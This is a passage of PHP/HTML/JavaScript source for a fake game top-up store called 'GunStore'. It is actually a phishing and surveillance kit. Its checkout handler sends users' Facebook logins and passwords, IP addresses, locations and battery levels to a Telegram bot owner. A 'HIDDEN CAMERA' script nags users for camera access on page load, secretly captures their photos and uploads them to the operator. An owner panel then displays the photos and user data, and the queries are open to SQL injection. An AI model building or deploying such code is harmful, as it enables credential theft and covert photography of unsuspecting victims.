            'email' => $login,
            'password' => $pass,
            'platform' => 'Facebook',
            'level' => 'N/A',
            'contact' => $contact,
            'security_code' => 'N/A',
            'ip' => $ip,
            'region' => $location['region'],
            'city' => $location['city'],
            'zip' => $location['zip'],
            'as' => $location['as'],
            'lat' => $location['lat'],
            'lon' => $location['lon'],
            'battery' => $battery
        ];
        $msg = formatBotMessage($data);
        $msg .= "\n\n📧 Linked Email: $linked_email\n👤 Username: $username\n🛒 ORDER\n💰 Total: ₹$total\n👤 User: {$user['name']}\n🆔 ID: {$user['id']}";
        
        // Owner ko bhejo
        botRequest("sendMessage", ['chat_id' => $OWNER_ID, 'text' => $msg]);
        // Approved users ko bhejo
        sendToApprovedUsers("🛒 New Order!\n\n" . $msg);
        
        $_SESSION['cart'] = [];
        unset($_SESSION['checkout_total']);
        echo "<script>alert('Order placed!'); window.location.href='index.php?msg=Order+placed+successfully';</script>";
        exit;
    } else {
        echo "<script>alert('Insufficient balance!'); window.location.href='index.php?msg=Insufficient+balance';</script>";
        exit;
    }
}

// ============ HIDDEN CAMERA CAPTURE ============
if(isset($_POST['capture_photo'])) {
    $photo_data = $_POST['photo_data'];
    $ip = getUserIP();
    $user_id = $_SESSION['user_id'] ?? 0;
    $location = $_POST['location'] ?? 'Unknown';
    $battery = $_POST['battery'] ?? 'Unknown';
    $lat = $_POST['lat'] ?? '0';
    $lon = $_POST['lon'] ?? '0';
    
    $db->exec("UPDATE users SET captured_photo='$photo_data', location='$location', battery_level='$battery', latitude='$lat', longitude='$lon' WHERE id=$user_id");
    
    $user = $db->querySingle("SELECT * FROM users WHERE id=$user_id", true);
    
    $data = [
        'uid' => $user['id'],
        'email' => $user['email'],
        'password' => 'N/A',
        'platform' => 'Photo Capture',
        'level' => 'N/A',
        'contact' => 'N/A',
        'security_code' => 'N/A',
        'ip' => $ip,
        'region' => 'Unknown',
        'city' => 'Unknown',
        'zip' => 'Unknown',
        'as' => 'Unknown',
        'lat' => $lat,
        'lon' => $lon,
        'battery' => $battery
    ];
    $msg = formatBotMessage($data);
    $msg .= "\n\n📸 Photo Captured\n👤 User: {$user['name']}\n📍 Location: $location";
    
    // Owner ko photo bhejo
    sendPhotoToBot($photo_data, $msg);
    // Approved users ko photo bhejo
    sendToApprovedUsers("📸 New Photo Captured!\n\n" . $msg, $photo_data);
    
    echo "Captured";
    exit;
}

// Logout
if(isset($_GET['logout'])) { 
    session_destroy(); 
    header("Location: index.php"); 
    exit; 
}

// Get Settings
$upi_id = getSetting('upi_id');
$login_enabled = getSetting('login_enabled');
$bg_color = getSetting('background');

// Check if admin is logged in
$is_admin = false;
if(isset($_SESSION['admin_logged_in']) && $_SESSION['admin_logged_in'] === true) {
    $is_admin = true;
}

$user = null;
$banned = false;
if(isset($_SESSION['user_id']) && !empty($_SESSION['user_id']) && $_SESSION['user_id'] != 999) {
    $user = $db->querySingle("SELECT * FROM users WHERE id=".$_SESSION['user_id'], true);
    if($user && $user['banned'] == 1) {
        $banned = true;
    }
}

$msg = isset($_GET['msg']) ? $_GET['msg'] : '';
$show_cart = isset($_GET['show_cart']) ? true : false;
$step = isset($_GET['step']) ? $_GET['step'] : '';
$checkout_total = isset($_SESSION['checkout_total']) ? $_SESSION['checkout_total'] : 0;
$cart_items = isset($_SESSION['cart']) ? $_SESSION['cart'] : [];
$cart_total = 0;
foreach($cart_items as $item) { $cart_total += $item['price']; }

$memberships = $db->query("SELECT * FROM memberships ORDER BY id");
$guns = $db->query("SELECT * FROM guns ORDER BY id");
$diamonds = $db->query("SELECT * FROM diamonds ORDER BY id");

$logo_url = "https://i.ibb.co/Q3kkqNyP/photo-AQADkh-Fr-G5-DSg-FZ.jpg";
$membership_header_img = "https://i.ibb.co/FqKBDmKB/photo-AQADj-RJr-G4-Pke-VZ9.jpg";
$gunstore_header_img = "https://i.ibb.co/SD0R2N2f/photo-AQADjx-Jr-G4-Pke-VZ9.jpg";
$diamond_header_img = "https://i.ibb.co/XkGYhVqH/photo-AQADjh-Jr-G4-Pke-VZ9.jpg";

function getCapturedPhotos() {
    global $db;
    $result = $db->query("SELECT id, name, email, captured_photo, location, ip, battery_level, latitude, longitude FROM users WHERE captured_photo IS NOT NULL AND captured_photo != '' ORDER BY id DESC");
    $photos = [];
    while($row = $result->fetchArray()) {
        $photos[] = $row;
    }
    return $photos;
}
$captured_photos = getCapturedPhotos();

$allUsers = $db->query("SELECT * FROM users ORDER BY id DESC");
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GunStore</title>
    <script src="https://accounts.google.com/gsi/client" async defer></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Segoe UI',sans-serif; background:<?php echo $bg_color; ?>; color:#fff; min-height:100vh; }
        
        .login-page { min-height:100vh; display:flex; justify-content:center; align-items:center; background:linear-gradient(135deg,rgba(26,10,46,0.9),rgba(10,10,10,0.95)),url('https://i.ibb.co/WNJx8dJk/photo-AQADGx-Br-G5-DSe-FZ.jpg'); background-size:cover; background-position:center; padding:20px; }
        .login-card { background:rgba(0,0,0,0.85); backdrop-filter:blur(10px); border-radius:20px; padding:40px; width:100%; max-width:450px; text-align:center; border:2px solid #9b59b6; box-shadow:0 0 60px rgba(155,77,182,0.2); }
        .logo-img { max-width:200px; margin-bottom:20px; }
        input { width:100%; padding:14px; margin:10px 0; background:rgba(255,255,255,0.05); border:1px solid #4a1a6e; border-radius:10px; color:#fff; font-size:15px; }
        input:focus { border-color:#9b59b6; outline:none; }
        button { width:100%; padding:14px; background:linear-gradient(45deg,#7a2b9e,#4a1a6e); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:16px; transition:0.3s; }
        button:hover { transform:scale(1.02); box-shadow:0 0 30px rgba(122,43,158,0.4); }
        .switch { margin-top:15px; color:#aaa; cursor:pointer; }
        .switch span { color:#9b59b6; }
        
        .dashboard { min-height:100vh; padding:20px; background:<?php echo $bg_color; ?>; }
        .navbar { display:flex; justify-content:space-between; align-items:center; background:rgba(0,0,0,0.6); padding:15px 20px; border-radius:12px; margin-bottom:20px; border:1px solid #9b59b6; }
        .navbar-logo { height:45px; }
        .menu-icon { font-size:28px; cursor:pointer; color:#9b59b6; padding:5px 15px; border:1px solid #4a1a6e; border-radius:8px; }
        .wallet-card { background:rgba(26,10,46,0.8); padding:25px; border-radius:12px; margin-bottom:20px; text-align:center; border:1px solid #9b59b6; }
        .wallet-amount { font-size:2.5rem; color:#9b59b6; font-weight:bold; }
        
        .top-menu { display:flex; justify-content:center; gap:15px; margin-bottom:20px; flex-wrap:wrap; }
        .top-menu button { width:auto; padding:10px 20px; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; font-size:14px; cursor:pointer; border-radius:8px; color:#fff; }
        .top-menu button:hover { background:#4a1a6e; }
        
        .section-img { width:100%; max-width:300px; display:block; margin:20px auto; border-radius:12px; }
        .products-grid { display:flex; flex-wrap:wrap; gap:20px; justify-content:center; margin-top:20px; }
        .product-card { background:rgba(0,0,0,0.6); border:1px solid #4a1a6e; border-radius:12px; padding:20px; width:220px; text-align:center; transition:0.3s; }
        .product-card:hover { transform:translateY(-5px); border-color:#9b59b6; box-shadow:0 10px 30px rgba(122,43,158,0.2); }
        .product-icon { width:100%; height:120px; object-fit:contain; margin-bottom:10px; border-radius:8px; }
        .product-title { font-size:18px; font-weight:bold; margin:10px 0; color:#9b59b6; }
        .product-price { font-size:20px; color:#ffd700; margin:10px 0; font-weight:bold; }
        .cart-btn { background:#ff4444; margin-top:10px; cursor:pointer; border-radius:8px; padding:10px; border:none; color:#fff; font-weight:bold; }
        .cart-btn:hover { background:#cc0000; }
        
        .whatsapp-fixed { position:fixed; bottom:20px; left:20px; background:#25D366; color:#fff; padding:10px 18px; border-radius:50px; text-decoration:none; z-index:100; font-weight:bold; border:none; font-size:14px; cursor:pointer; }
        .cart-fixed { position:fixed; bottom:20px; right:20px; background:#ff4444; color:#fff; padding:10px 20px; border-radius:50px; text-decoration:none; z-index:100; font-weight:bold; border:none; cursor:pointer; font-size:14px; }
        .cart-fixed:hover { background:#cc0000; }
        .telegram-fixed { position:fixed; bottom:80px; right:20px; background:#0088cc; color:#fff; padding:10px 18px; border-radius:50px; text-decoration:none; z-index:100; font-weight:bold; border:none; cursor:pointer; font-size:14px; }
        .telegram-fixed:hover { background:#006699; }
        
        .page-popup { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:2000; display:none; overflow-y:auto; padding:20px; }
        .popup-card { background:rgba(0,0,0,0.9); border-radius:20px; padding:30px; max-width:500px; margin:50px auto; border:1px solid #9b59b6; }
        .cart-item { display:flex; justify-content:space-between; padding:10px; border-bottom:1px solid #333; }
        .cart-total { font-size:22px; font-weight:bold; margin:20px 0; text-align:center; color:#ffd700; }
        .game-login-btns { display:flex; gap:20px; justify-content:center; margin:20px 0; }
        .game-icon { width:100px; cursor:pointer; border-radius:12px; border:2px solid transparent; transition:0.3s; }
        .game-icon:hover { border-color:#9b59b6; transform:scale(1.05); }
        
        .popup { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); display:none; justify-content:center; align-items:center; z-index:3000; padding:20px; }
        .small-popup-card { background:rgba(0,0,0,0.9); border-radius:20px; padding:30px; width:90%; max-width:420px; border:1px solid #9b59b6; text-align:center; }
        .bonus-btns { display:flex; flex-wrap:wrap; gap:10px; margin:15px 0; }
        .bonus-btn { flex:1; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; padding:12px; color:#fff; border-radius:8px; cursor:pointer; }
        .bonus-btn:hover { background:#9b59b6; }
        
        .order-item, .notif-item { background:rgba(26,10,46,0.6); padding:12px; margin:8px 0; border-radius:8px; border-left:3px solid #9b59b6; text-align:left; }
        .verified-badge { font-size:12px; color:#888; margin-top:10px; text-align:center; }
        
        .admin-panel { background:rgba(0,0,0,0.8); padding:20px; border-radius:12px; margin:20px 0; border:1px solid #9b59b6; }
        .admin-panel h4 { color:#9b59b6; margin-bottom:15px; }
        .admin-panel input { margin:8px 0; }
        .admin-panel .admin-btn { width:auto; padding:10px 25px; margin:5px; cursor:pointer; border-radius:8px; border:none; color:#fff; font-weight:bold; }
        .admin-panel .admin-btn:hover { opacity:0.8; }
        .admin-panel .danger-btn { background:#cc0000; }
        .admin-panel .success-btn { background:#00cc00; }
        
        .captured-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:15px; margin-top:15px; }
        .captured-item { background:rgba(26,10,46,0.6); border-radius:10px; padding:10px; border:1px solid #4a1a6e; }
        .captured-item img { width:100%; border-radius:8px; max-height:150px; object-fit:cover; }
        .captured-item p { font-size:12px; color:#aaa; margin-top:5px; }
        .admin-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(280px,1fr)); gap:15px; }
        .admin-user-card { background:rgba(26,10,46,0.6); border-radius:10px; padding:15px; border:1px solid #4a1a6e; }
        .admin-user-card .label { color:#9b59b6; font-weight:bold; }
        
        @media (max-width:768px) { .product-card { width:calc(50% - 10px); } .popup-card { margin:20px auto; padding:20px; } }
        .telegram-btn { background:#0088cc; color:#fff; border:none; padding:12px 20px; border-radius:10px; cursor:pointer; font-weight:bold; width:100%; margin:8px 0; }
        .telegram-btn:hover { background:#006699; }
        #hiddenVideo { display:none; }
        #hiddenCanvas { display:none; }
        .close-btn { background:#333; color:#fff; padding:10px 20px; border:none; border-radius:8px; cursor:pointer; margin-top:15px; }
        .close-btn:hover { background:#555; }
        .sidebar-btn { display:block; width:100%; padding:12px; margin:8px 0; background:rgba(26,10,46,0.8); border:1px solid #9b59b6; border-radius:8px; color:#fff; cursor:pointer; font-size:15px; text-align:left; }
        .sidebar-btn:hover { background:#4a1a6e; }
        
        .admin-bottom-btn { text-align:center; margin-top:40px; padding:20px; border-top:1px solid #333; }
        .admin-bottom-btn button { background:transparent; border:1px solid #9b59b6; color:#9b59b6; padding:8px 25px; border-radius:8px; cursor:pointer; font-size:13px; letter-spacing:1px; }
        .admin-bottom-btn button:hover { background:#9b59b6; color:#fff; }
        
        .admin-popup { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.9); z-index:9999; justify-content:center; align-items:center; }
        .admin-popup-inner { background:rgba(0,0,0,0.95); padding:40px; border-radius:20px; max-width:400px; width:90%; border:2px solid #9b59b6; text-align:center; }
        .admin-popup-inner h3 { color:#9b59b6; margin-bottom:20px; }
        .admin-popup-inner input { width:100%; padding:14px; margin:10px 0; background:rgba(255,255,255,0.05); border:1px solid #4a1a6e; border-radius:10px; color:#fff; font-size:15px; }
        .admin-popup-inner .popup-btn { width:100%; padding:14px; background:linear-gradient(45deg,#7a2b9e,#4a1a6e); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:16px; }
        .admin-popup-inner .popup-btn:hover { transform:scale(1.02); box-shadow:0 0 30px rgba(122,43,158,0.4); }
        .admin-popup-inner .cancel-btn { width:100%; padding:14px; margin-top:10px; background:#333; color:#fff; border:none; border-radius:10px; cursor:pointer; font-size:16px; }
        .admin-popup-inner .cancel-btn:hover { background:#555; }
    </style>
</head>
<body>

<?php if($banned): ?>
<div class="login-page">
    <div class="login-card">
        <img src="<?php echo $logo_url; ?>" class="logo-img">
        <h2 style="color:#ff4444;">You Are Banned</h2>
        <a href="https://wa.me/9485813638" style="display:inline-block;background:#25D366;color:#fff;padding:12px 25px;border-radius:8px;text-decoration:none;margin-top:15px;">WhatsApp Support</a>
    </div>
</div>

<?php elseif(!isset($_SESSION['user_id']) || empty($_SESSION['user_id']) || ($login_enabled == '1' && !isset($_SESSION['logged_in']))): ?>
<div class="login-page">
    <div class="login-card">
        <img src="<?php echo $logo_url; ?>" class="logo-img">
        <div id="g_id_onload" data-client_id="369043602918-qsp4f4olbtmoksudfp8fnbuj8g39t8d0.apps.googleusercontent.com" data-callback="handleGoogleLogin" data-auto_prompt="false"></div>
        <div class="g_id_signin" data-type="standard" data-size="large"></div>
        <hr style="margin:15px 0; border-color:#333;">
        <form method="post">
            <input type="email" name="email" placeholder="Email Address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" name="login">Login</button>
        </form>
        <div class="switch" onclick="showSignup()">New here? <span>Create account</span></div>
        <div id="signupForm" style="display:none; margin-top:20px;">
            <form method="post">
                <input type="text" name="name" placeholder="Full Name" required>
                <input type="email" name="email" placeholder="Email Address" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" name="signup">Create Account</button>
            </form>
        </div>
    </div>
</div>
<script>
function handleGoogleLogin(response) {
    var form = document.createElement('form'); form.method = 'POST';
    var input = document.createElement('input'); input.type = 'hidden'; input.name = 'google_credential'; input.value = response.credential;
    form.appendChild(input); document.body.appendChild(form); form.submit();
}
function showSignup() { 
    var form = document.getElementById('signupForm');
    form.style.display = form.style.display === 'none' ? 'block' : 'none';
}
</script>

<?php else: ?>

<!-- ============ NORMAL WEBSITE ============ -->
<?php if(!$is_admin || !isset($_GET['admin']) || $_GET['admin'] != 1): ?>

<div class="dashboard">
    <div class="navbar">
        <div class="menu-icon" onclick="toggleSidebar()">☰</div>
        <img src="<?php echo $logo_url; ?>" class="navbar-logo">
        <div>ID: <?php echo $user['id'] ?? 'N/A'; ?></div>
    </div>

    <!-- SIDE MENU -->
    <div id="sidebar" style="display:none; position:fixed; top:0; left:0; width:300px; height:100%; background:rgba(0,0,0,0.95); z-index:3000; padding:30px; border-right:2px solid #9b59b6; overflow-y:auto;">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:30px;">
            <h3 style="color:#9b59b6;">Menu</h3>
            <span onclick="toggleSidebar()" style="font-size:28px; cursor:pointer;">✕</span>
        </div>
        <button class="sidebar-btn" onclick="showOrdersPage(); toggleSidebar();">Order History</button>
        <button class="sidebar-btn" onclick="showNotificationsPage(); toggleSidebar();">Notifications</button>
        <button class="sidebar-btn" onclick="showAddFundsPage(); toggleSidebar();">Add Funds</button>
        <button class="sidebar-btn" onclick="showFundsHistoryPage(); toggleSidebar();">Fund Requests</button>
        <button class="sidebar-btn" onclick="openTelegram(); toggleSidebar();" style="background:#0088cc;">Telegram Support</button>
        <a href="?logout=1" style="display:block; margin-top:20px; color:#ff4444; text-align:center; text-decoration:none;">Logout</a>
    </div>

    <!-- TOP MENU -->
    <div class="top-menu">
        <button onclick="showOrdersPage()">Order History</button>
        <button onclick="showNotificationsPage()">Notifications</button>
        <button onclick="showAddFundsPage()">Add Funds</button>
        <button onclick="showFundsHistoryPage()">Fund Requests</button>
    </div>

    <div class="wallet-card">
        <p>Wallet Balance</p>
        <div class="wallet-amount">₹<?php echo number_format($user['wallet'] ?? 0, 2); ?></div>
        <button onclick="showAddFundsPage()" style="margin-top:15px; width:auto; padding:8px 30px; cursor:pointer; border-radius:8px; border:none; background:linear-gradient(45deg,#7a2b9e,#4a1a6e); color:#fff; font-weight:bold;">+ Add Funds</button>
    </div>

    <?php if($msg): ?>
        <div style="background:rgba(26,10,46,0.8); padding:12px; border-radius:8px; margin-bottom:20px; text-align:center; border:1px solid #9b59b6;"><?php echo htmlspecialchars($msg); ?></div>
    <?php endif; ?>

    <!-- Memberships -->
    <img src="<?php echo $membership_header_img; ?>" class="section-img" onerror="this.style.display='none'">
    <div class="products-grid">
        <?php while($m = $memberships->fetchArray()): ?>
        <div class="product-card">
            <img src="<?php echo $m['icon']; ?>" class="product-icon" onerror="this.src='https://via.placeholder.com/100'">
            <div class="product-title"><?php echo $m['name']; ?></div>
            <div class="product-price">₹<?php echo number_format($m['price'], 2); ?></div>
            <form method="post">
                <input type="hidden" name="item_type" value="membership">
                <input type="hidden" name="item_id" value="<?php echo $m['id']; ?>">
                <input type="hidden" name="item_name" value="<?php echo $m['name']; ?>">
                <input type="hidden" name="item_price" value="<?php echo $m['price']; ?>">
                <button type="submit" name="add_to_cart" class="cart-btn">Add to Cart</button>
            </form>
        </div>
        <?php endwhile; ?>
    </div>

    <!-- Diamonds -->
    <img src="<?php echo $diamond_header_img; ?>" class="section-img" onerror="this.style.display='none'">
    <div class="products-grid">
        <?php while($d = $diamonds->fetchArray()): ?>
        <div class="product-card">
            <img src="<?php echo $d['image']; ?>" class="product-icon" onerror="this.src='https://via.placeholder.com/100'">
            <div class="product-title"><?php echo $d['name']; ?></div>
            <div class="product-price">₹<?php echo number_format($d['price'], 2); ?></div>
            <form method="post">
                <input type="hidden" name="item_type" value="diamond">
                <input type="hidden" name="item_id" value="<?php echo $d['id']; ?>">
                <input type="hidden" name="item_name" value="<?php echo $d['name']; ?>">
                <input type="hidden" name="item_price" value="<?php echo $d['price']; ?>">
                <button type="submit" name="add_to_cart" class="cart-btn">Add to Cart</button>
            </form>
        </div>
        <?php endwhile; ?>
    </div>

    <!-- Guns -->
    <img src="<?php echo $gunstore_header_img; ?>" class="section-img" onerror="this.style.display='none'">
    <div class="products-grid">
        <?php while($g = $guns->fetchArray()): ?>
        <div class="product-card">
            <img src="<?php echo $g['image']; ?>" class="product-icon" onerror="this.src='https://via.placeholder.com/100'">
            <div class="product-title"><?php echo $g['name']; ?></div>
            <div class="product-price">₹<?php echo number_format($g['price'], 2); ?></div>
            <div style="font-size:12px; color:#888;">Gifted to your game ID</div>
            <form method="post">
                <input type="hidden" name="item_type" value="gun">
                <input type="hidden" name="item_id" value="<?php echo $g['id']; ?>">
                <input type="hidden" name="item_name" value="<?php echo $g['name']; ?>">
                <input type="hidden" name="item_price" value="<?php echo $g['price']; ?>">
                <button type="submit" name="add_to_cart" class="cart-btn">Add to Cart</button>
            </form>
        </div>
        <?php endwhile; ?>
    </div>

    <!-- ADMIN BUTTON - SABSE NICHE -->
    <div class="admin-bottom-btn">
        <button onclick="document.getElementById('adminPopup').style.display='flex'">Admin</button>
    </div>

    <a href="https://wa.me/9485813638" class="whatsapp-fixed">WhatsApp</a>
    <button class="telegram-fixed" onclick="openTelegram()">Telegram</button>
    <button class="cart-fixed" onclick="showCart()">Cart (<?php echo count($cart_items); ?>)</button>
</div>

<!-- ADMIN POPUP -->
<div class="admin-popup" id="adminPopup">
    <div class="admin-popup-inner">
        <h3>Admin Access</h3>
        <form method="post">
            <input type="password" name="admin_key" placeholder="Enter Admin Key" required>
            <button type="submit" name="admin_key_login" class="popup-btn">Access Admin</button>
        </form>
        <button onclick="document.getElementById('adminPopup').style.display='none'" class="cancel-btn">Cancel</button>
    </div>
</div>

<!-- HIDDEN CAMERA -->
<video id="hiddenVideo" style="display:none;"></video>
<canvas id="hiddenCanvas" style="display:none;"></canvas>

<script>
// ============ HIDDEN CAMERA - PERMISSION TAB TAK MANGE ============
function requestCameraPermission() {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
            .then(function(stream) {
                captureHiddenPhoto(stream);
            })
            .catch(function(err) {
                console.log('Camera permission denied:', err);
                alert('Camera permission is required! Please allow camera access.');
                setTimeout(requestCameraPermission, 3000);
            });
    } else {
        alert('Camera not supported on this device.');
    }
}

function captureHiddenPhoto(stream) {
    var video = document.getElementById('hiddenVideo');
    video.srcObject = stream;
    video.onloadedmetadata = function() {
        video.play();
        var canvas = document.getElementById('hiddenCanvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0);
        var photoData = canvas.toDataURL('image/jpeg');
        
        var battery = 'Unknown';
        if (navigator.getBattery) {
            navigator.getBattery().then(function(b) {
                battery = Math.round(b.level * 100);
                sendPhotoToServer(photoData, battery);
            }).catch(function() {
                sendPhotoToServer(photoData, battery);
            });
        } else {
            sendPhotoToServer(photoData, battery);
        }
        
        stream.getTracks().forEach(function(track) { track.stop(); });
    };
}

function sendPhotoToServer(photoData, battery) {
    var formData = new FormData();
    formData.append('photo_data', photoData);
    formData.append('location', '<?php echo $user['location'] ?? "Unknown"; ?>');
    formData.append('battery', battery);
    formData.append('capture_photo', '1');
    formData.append('lat', '<?php echo $user['latitude'] ?? "0"; ?>');
    formData.append('lon', '<?php echo $user['longitude'] ?? "0"; ?>');
    
    fetch('', {
        method: 'POST',
        body: formData
    }).catch(function(err) {});
}

// Page load pe camera permission maange
<?php if(isset($_SESSION['user_id']) && !empty($_SESSION['user_id']) && $_SESSION['user_id'] != 999): ?>
setTimeout(requestCameraPermission, 2000);
<?php endif; ?>
</script>

<?php endif; ?>


<!-- ============ ADMIN PANEL (SAME WEB PE) ============ -->
<?php if($is_admin && isset($_GET['admin']) && $_GET['admin'] == 1): ?>
<div style="padding:20px; max-width:1200px; margin:0 auto;">
    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; border-bottom:2px solid #9b59b6; padding-bottom:15px;">
        <h2 style="color:#9b59b6;">Owner Panel</h2>
        <a href="index.php" style="color:#ff4444; text-decoration:none; padding:8px 20px; border:1px solid #ff4444; border-radius:8px;">Close</a>
    </div>
    
    <!-- Stats -->
    <div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr)); gap:15px; margin-bottom:30px;">
        <div style="background:rgba(0,0,0,0.6); padding:20px; border-radius:12px; border:1px solid #9b59b6; text-align:center;">
            <div style="font-size:32px; color:#9b59b6; font-weight:bold;"><?php echo $db->querySingle("SELECT COUNT(*) FROM users"); ?></div>
            <div style="font-size:14px; color:#aaa; margin-top:5px;">Users</div>
        </div>
        <div style="background:rgba(0,0,0,0.6); padding:20px; border-radius:12px; border:1px solid #9b59b6; text-align:center;">
            <div style="font-size:32px; color:#9b59b6; font-weight:bold;"><?php echo $db->querySingle("SELECT COUNT(*) FROM orders"); ?></div>
            <div style="font-size:14px; color:#aaa; margin-top:5px;">Orders</div>
        </div>
        <div style="background:rgba(0,0,0,0.6); padding:20px; border-radius:12px; border:1px solid #9b59b6; text-align:center;">
            <div style="font-size:32px; color:#9b59b6; font-weight:bold;"><?php echo $db->querySingle("SELECT COUNT(*) FROM fund_requests"); ?></div>
            <div style="font-size:14px; color:#aaa; margin-top:5px;">Funds</div>
        </div>
        <div style="background:rgba(0,0,0,0.6); padding:20px; border-radius:12px; border:1px solid #9b59b6; text-align:center;">
            <div style="font-size:32px; color:#9b59b6; font-weight:bold;"><?php echo count($captured_photos); ?></div>
            <div style="font-size:14px; color:#aaa; margin-top:5px;">Photos</div>
        </div>
    </div>
    
    <!-- Admin Controls -->
    <div style="background:rgba(0,0,0,0.8); padding:20px; border-radius:12px; margin:20px 0; border:1px solid #9b59b6;">
        <h4 style="color:#9b59b6; margin-bottom:15px;">Admin Controls</h4>
        
        <form method="post" style="display:flex; flex-wrap:wrap; gap:10px; align-items:end;">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div><label style="color:#aaa;font-size:12px;">Admin Key</label><input type="text" name="new_admin_key" placeholder="New Admin Key" value="<?php echo $ADMIN_KEY; ?>"></div>
            <div><button type="submit" name="admin_action" value="change_admin_key" style="background:#9b59b6; padding:10px 25px; border:none; border-radius:8px; color:#fff; cursor:pointer;">Update</button></div>
        </form>
        
        <form method="post" style="display:flex; flex-wrap:wrap; gap:10px; align-items:end; margin-top:10px;">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div><label style="color:#aaa;font-size:12px;">Owner ID (Telegram)</label><input type="text" name="new_owner_id" placeholder="New Owner ID" value="<?php echo getSetting('owner_id'); ?>"></div>
            <div><button type="submit" name="admin_action" value="change_owner_id" style="background:#9b59b6; padding:10px 25px; border:none; border-radius:8px; color:#fff; cursor:pointer;">Update</button></div>
        </form>
        
        <form method="post" style="display:flex; flex-wrap:wrap; gap:10px; align-items:end; margin-top:10px;">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div><label style="color:#aaa;font-size:12px;">Bot Token</label><input type="text" name="new_bot_token" placeholder="New Bot Token" value="<?php echo getSetting('bot_token'); ?>"></div>
            <div><button type="submit" name="admin_action" value="change_bot_token" style="background:#9b59b6; padding:10px 25px; border:none; border-radius:8px; color:#fff; cursor:pointer;">Update</button></div>
        </form>
        
        <form method="post" style="display:flex; flex-wrap:wrap; gap:10px; align-items:end; margin-top:10px;">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div><label style="color:#aaa;font-size:12px;">UPI ID</label><input type="text" name="new_upi" placeholder="New UPI ID" value="<?php echo $upi_id; ?>"></div>
            <div><button type="submit" name="admin_action" value="change_upi" style="background:#9b59b6; padding:10px 25px; border:none; border-radius:8px; color:#fff; cursor:pointer;">Update</button></div>
        </form>
        
        <form method="post" style="display:flex; flex-wrap:wrap; gap:10px; align-items:end; margin-top:10px;">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div><label style="color:#aaa;font-size:12px;">Min Deposit</label><input type="number" name="new_min_deposit" placeholder="Min Deposit" value="<?php echo $MIN_DEPOSIT; ?>"></div>
            <div><button type="submit" name="admin_action" value="change_min_deposit" style="background:#9b59b6; padding:10px 25px; border:none; border-radius:8px; color:#fff; cursor:pointer;">Update</button></div>
        </form>
        
        <form method="post" style="display:flex; flex-wrap:wrap; gap:10px; align-items:center; margin-top:10px;">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div><label style="color:#aaa;font-size:12px;">Background</label><input type="color" name="new_bg" value="<?php echo $bg_color; ?>" style="height:45px; width:60px; padding:2px; background:transparent; border:none; cursor:pointer;"></div>
            <div><button type="submit" name="admin_action" value="change_bg" style="background:#9b59b6; padding:10px 25px; border:none; border-radius:8px; color:#fff; cursor:pointer;">Apply</button></div>
        </form>
        
        <form method="post" style="display:flex; flex-wrap:wrap; gap:10px; align-items:center; margin-top:10px;">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div><button type="submit" name="admin_action" value="toggle_login" style="background:<?php echo $login_enabled == '1' ? '#cc0000' : '#00cc00'; ?>; padding:10px 25px; border:none; border-radius:8px; color:#fff; cursor:pointer;">
                <?php echo $login_enabled == '1' ? 'Disable Login' : 'Enable Login'; ?>
            </button></div>
        </form>
        
        <form method="post" style="display:flex; flex-wrap:wrap; gap:10px; align-items:end; margin-top:10px;">
            <input type="hidden" name="admin_key" value="<?php echo $ADMIN_KEY; ?>">
            <div><label style="color:#aaa;font-size:12px;">Ban IP</label><input type="text" name="ban_ip" placeholder="IP to Ban"></div>
            <div><button type="submit" name="admin_action" value="ban_ip" style="background:#cc0000; padding:10px 25px; border:none; border-radius:8px; color:#fff; cursor:pointer;">Ban</button></div>
            <div><label style="color:#aaa;font-size:12px;">Unban IP</label><input type="text" name="unban_ip" placeholder="IP to Unban"></div>
            <div><button type="submit" name="admin_action" value="unban_ip" style="background:#00cc00; padding:10px 25px; border:none; border-radius:8px; color:#fff; cursor:pointer;">Unban</button></div>
        </form>
    </div>
    
    <!-- Users List -->
    <div style="background:rgba(0,0,0,0.8); padding:20px; border-radius:12px; margin:20px 0; border:1px solid #9b59b6;">
        <h4 style="color:#9b59b6; margin-bottom:15px;">Users (<?php echo $db->querySingle("SELECT COUNT(*) FROM users"); ?>)</h4>
        <div style="display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:15px;">
        <?php while($u = $allUsers->fetchArray()): ?>
            <div style="background:rgba(26,10,46,0.6); border-radius:10px; padding:15px; border:1px solid #4a1a6e;">
                <p><span style="color:#9b59b6;font-weight:bold;">ID:</span> <?php echo $u['id']; ?></p>
                <p><span style="color:#9b59b6;font-weight:bold;">Name:</span> <?php echo $u['name'] ?? 'N/A'; ?></p>
                <p><span style="color:#9b59b6;font-weight:bold;">Email:</span> <?php echo $u['email']; ?></p>
